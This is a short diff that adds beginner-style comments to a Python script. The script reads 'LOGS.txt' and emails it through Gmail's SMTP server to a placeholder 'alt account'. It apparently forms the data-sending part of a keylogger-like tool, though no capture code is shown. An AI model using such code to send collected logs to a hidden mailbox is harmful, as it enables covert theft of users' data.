@@ -4,17 +4,17 @@ import smtplib
 from email.mime.text import MIMEText
 
 with open('LOGS.txt', 'r') as file:
-    data = file.read()
+    data = file.read() # Opens the file and reads the data
 
 smtp_ssl_host = 'smtp.gmail.com'  # smtp.mail.yahoo.com
-smtp_ssl_port = 465
+smtp_ssl_port = 465 #sets the port for the server
 email = 'ENTER_ALT_EMAIL' # Your alt acount's email
 password = 'ENTER_PASSWORD' # Password of your alt account
-sender = email
+sender = email # sets the sender to your email
 target = [email] # Must be a list, can enter other emails
 
-msg = MIMEText(data)
-msg['Subject'] = 'logs'
+msg = MIMEText(data) # sets the contents of the email
+msg['Subject'] = 'logs' # sets the subject
 msg['From'] = sender
 msg['To'] = ', '.join(target)
 
